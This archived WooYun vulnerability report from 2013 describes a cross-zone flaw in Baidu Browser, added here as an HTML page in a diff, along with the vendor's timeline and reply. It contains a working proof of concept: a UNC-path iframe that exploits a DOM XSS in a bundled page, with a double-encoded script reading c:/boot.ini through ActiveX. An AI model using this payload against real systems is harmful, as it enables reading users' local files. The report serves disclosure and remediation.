@@ -1,0 +1,209 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度浏览器本地任意文件读取漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度浏览器本地任意文件读取漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/只抽红梅">只抽红梅</a> 
+</li><li>提交时间：		2013-11-06 17:23</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-11：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-21：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-01：	细节向普通白帽子公开<br/>
+									2013-12-11：	细节向实习白帽子公开<br/>
+									2013-12-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">百度浏览器在实现跨域方面存在缺陷导致该漏洞。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">从 internet 域跨到 127.0.0.1 域会产生安全问题，所以目前大部分浏览器都进行了防御，但是百度浏览器在 IE 内核下却没有任何限制。<br />
+<br />
+通过下面代码可以进行测试：<br />
+<br />
+</p><pre><code>&lt;!DOCTYPE html&gt;<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br />
+&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=8&quot;/&gt;<br />
+&lt;title&gt;SOP fuzz&lt;/title&gt;<br />
+&lt;body&gt;<br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+&lt;/script&gt;<br />
+file &lt;br/&gt;<br />
+&lt;iframe src=&quot;file:///c:/fuzz/alert_1.html&quot;&gt;&lt;/iframe&gt;<br />
+&lt;br/&gt;<br />
+file unc &lt;br/&gt;<br />
+&lt;iframe src=&quot;\\127.0.0.1\c$/fuzz/alert_2.html&quot;&gt;&lt;/iframe&gt;<br />
+&lt;br/&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+alert_1.html 和 alert_2.html 是我本地两个测试文件，通过任意 internet 域访问该页面可以发现 alert_2.html 中的代码执行了。说明百度浏览器对访问 file 域有限制，对访问 127.0.0.1 无限制。<br />
+<br />
+其实到这里就是漏洞的全部，为了配合对这个漏洞进行利用，我们发现百度浏览器自带的这个页面 C:\Program Files\baidu\BaiduBrowser\resource\extension\security\safe_default.html 存在 dom xss。<br />
+<br />
+</p><pre><code>function queryHash(h){<br />
+		    	var data = (h.replace(&quot;#&quot;,&quot;&quot;)||&quot;name=360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe360.exe&amp;path=c:\profile\360.exe&quot;).split(&quot;&amp;&quot;);<br />
+			    var obj = {};<br />
+			    for(var i=0,d;d=data[i];i++){<br />
+			    	var r = d.split(&quot;=&quot;);<br />
+			    	obj[r[0]] = r[1];<br />
+			    }<br />
+			    return obj;<br />
+		    }<br />
+		    var info = document.getElementById(&quot;info&quot;);<br />
+			var obj = queryHash(decodeURIComponent(location.hash).replace(&quot;#&quot;, &quot;&quot;));<br />
+			document.getElementById(&quot;name&quot;).innerHTML = obj.name;<br />
+			document.getElementById(&quot;path&quot;).innerHTML = obj.path;</code></pre><p class='detail'><br />
+<br />
+直接就用 innerHTML 写入从 URL 中取出的内容。<br />
+<br />
+so，通过下面 poc，来读取本地文件：<br />
+<br />
+</p><pre><code>&lt;iframe src=&#039;\\127.0.0.1\c$/Program Files\baidu\BaiduBrowser\resource\extension\security\safe_default.html#name=xxx&lt;script defer&gt;eval(unescape(unescape(&quot;xmlhttp%253Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP.3.0%2522%2529%253Bxmlhttp.open%2528%2522GET%2522%252C%2522file%253A////127.0.0.1/c%2524/boot.ini%2522%252Cfalse%2529%253Bxmlhttp.send%2528%2529%253Balert%2528xmlhttp.responseText%2529%253B&quot;)))&lt;/script&gt;&amp;path=yyy&#039;&gt;&lt;/iframe&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">&lt;iframe src=&#039;\\127.0.0.1\c$/Program Files\baidu\BaiduBrowser\resource\extension\security\safe_default.html#name=xxx&lt;script defer&gt;eval(unescape(unescape(&quot;xmlhttp%253Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP.3.0%2522%2529%253Bxmlhttp.open%2528%2522GET%2522%252C%2522file%253A////127.0.0.1/c%2524/boot.ini%2522%252Cfalse%2529%253Bxmlhttp.send%2528%2529%253Balert%2528xmlhttp.responseText%2529%253B&quot;)))&lt;/script&gt;&amp;path=yyy&#039;&gt;&lt;/iframe&gt; </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、限定 internet 域对 127.0.0.1 域的访问。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/只抽红梅" title="只抽红梅">只抽红梅</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-042156" title="百度浏览器本地任意文件读取漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：7 </p>
+													<p class="detail">确认时间：2013-11-11 11:33</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对百度安全的关注，安全组立即处理此问题。<br />
+--“百度，因你更安全”</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="42156";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
